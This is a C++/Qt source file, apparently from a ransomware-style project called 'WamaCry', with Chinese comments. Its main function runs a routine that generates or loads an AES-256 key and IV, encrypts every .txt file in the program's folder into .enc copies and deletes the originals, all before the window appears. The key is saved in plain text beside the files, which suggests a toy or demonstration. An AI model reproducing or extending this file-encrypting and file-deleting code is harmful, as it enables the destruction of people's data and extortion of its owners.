#include "wamacry.h"
#include <QApplication>
#include <QDir>
#include <QFile>
#include <QTextStream>
#include <QCryptographicHash>
#include <QRandomGenerator>
#include "qaesencryption.h"

QByteArray generateRandomBytes(int length)
{
    QByteArray bytes(length, 0);
    for (int i = 0; i < length; ++i)
    {
        bytes[i] = static_cast<char>(QRandomGenerator::global()->generate() % 256);
    }
    return bytes;
}

QByteArray aesEncrypt(const QByteArray& plaintext, const QByteArray& key, const QByteArray& iv)
{
    QAESEncryption encryption(QAESEncryption::AES_256, QAESEncryption::CBC);
    return encryption.encode(plaintext, key, iv);
}

void handleTxtFiles()
{
    QString appDir = QCoreApplication::applicationDirPath();
    QDir dir(appDir);
    QStringList txtFiles = dir.entryList(QStringList() << "*.txt", QDir::Files);

    // 检查是否存在 aes.txt 文件
    QString aesFilePath = dir.absoluteFilePath("aes.txt");
    QByteArray key;
    QByteArray iv;

    if (QFile::exists(aesFilePath))
    {
        QFile aesFile(aesFilePath);
        if (aesFile.open(QIODevice::ReadOnly | QIODevice::Text))
        {
            QTextStream aesStream(&aesFile);
            QString keyHex, ivHex;
            aesStream.readLineInto(&keyHex);
            aesStream.readLineInto(&ivHex);
            key = QByteArray::fromHex(keyHex.toUtf8());
            iv = QByteArray::fromHex(ivHex.toUtf8());
            aesFile.close();
        }
    }
    else
    {
        // 生成随机 AES 密钥和 IV
        key = generateRandomBytes(32); // 256 位密钥
        iv = generateRandomBytes(16); // 128 位 IV

        // 保存 AES 密钥和 IV 到 aes.txt 文件
        QFile aesFile(aesFilePath);
        if (aesFile.open(QIODevice::WriteOnly | QIODevice::Text))
        {
            QTextStream aesStream(&aesFile);
            aesStream << key.toHex() << "\n";
            aesStream << iv.toHex() << "\n";
            aesFile.close();
        }
    }

    foreach(QString filename, txtFiles)
    {
        if (filename == "aes.txt")
        {
            continue; // 跳过 aes.txt 文件
        }

        QFile file(dir.absoluteFilePath(filename));
        if (file.open(QIODevice::ReadWrite | QIODevice::Text))
        {
            QTextStream stream(&file);
            QString content = stream.readAll();
            file.close();

            QByteArray encrypted = aesEncrypt(content.toUtf8(), key, iv); // 使用 AES 加密内容
            QString encryptedFilename = filename + ".enc"; // 保存加密后的内容
            QFile encryptedFile(dir.absoluteFilePath(encryptedFilename));
            if (encryptedFile.open(QIODevice::WriteOnly))
            {
                encryptedFile.write(encrypted);
                encryptedFile.close();
            }

            file.remove(); // 删除原始文件
        }
    }
}

int main(int argc, char *argv[])
{
    handleTxtFiles(); // 在程序启动之前处理 txt 文件

    QApplication a(argc, argv);
    WamaCry w;
    w.show();
    return a.exec();
}
